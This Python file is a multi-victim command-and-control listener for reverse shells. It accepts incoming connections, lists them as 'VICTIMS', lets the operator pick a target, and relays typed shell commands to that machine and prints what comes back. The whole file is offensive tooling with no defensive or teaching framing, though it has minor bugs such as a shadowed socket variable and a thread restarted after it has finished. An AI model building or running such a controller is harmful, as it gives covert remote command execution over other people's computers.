import socket , threading, time

IP   = '192.168.1.5'     ### Your machine IP
PORT = 4442
DATA_SIZE = 10024


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IP, PORT))

USERS = {}

def PLAYER_HANDLER(conn, addr):
    print('connect to ', addr)

    try:
        connect = True
        while connect:
            cmd_send = input('cmd : ')
            if cmd_send != '':
                conn.send(cmd_send.encode())

                time.sleep(2)
                x = conn.recv(DATA_SIZE).decode()
                
                print(x)
                time.sleep(1)
            
    except ConnectionResetError:
        print('CONNECTION LOST !!!')
        
    finally:
        del USERS[addr]
        print('connection LOST',addr)
        thread_2.start()


def start():
    print('SERVER HAS BEEN START')
    
    while True:
        s.listen()
        conn, addr = s.accept()

        if conn not in USERS:
            USERS[addr] = conn
    
        # thread = threading.Thread(target=PLAYER_HANDLER, args=(conn, addr))
        # thread.start()
    
def userConnected():
    SELECT = ''
    while True:
        cmdLine = input('|-> ')
        if cmdLine == 'show':
            s=1
            for i in USERS.values():
                print(f'$[copy ip:port] [{i}] Id={s}')
                s+=1
        elif cmdLine == 'set':
            SELECT = input('select > ')

        elif cmdLine == 'run'and SELECT != '' :
           
            for i, k in USERS.items():
                if str(k) == SELECT:
                    thread_3 = threading.Thread(target=PLAYER_HANDLER, args=(k, i))
                    thread_3.start()
                    return
        else:
            print('show => VICTIMS ; set => SET TARGET ; run => exploit')
                
                




if __name__ == '__main__':
    thread_1 = threading.Thread(target=start)
    thread_1.start()
    while len(USERS) == 0:
        print('LISTENING [PLEASE WAIT]')
        time.sleep(3)
    thread_2 = threading.Thread(target=userConnected)
    thread_2.start()
    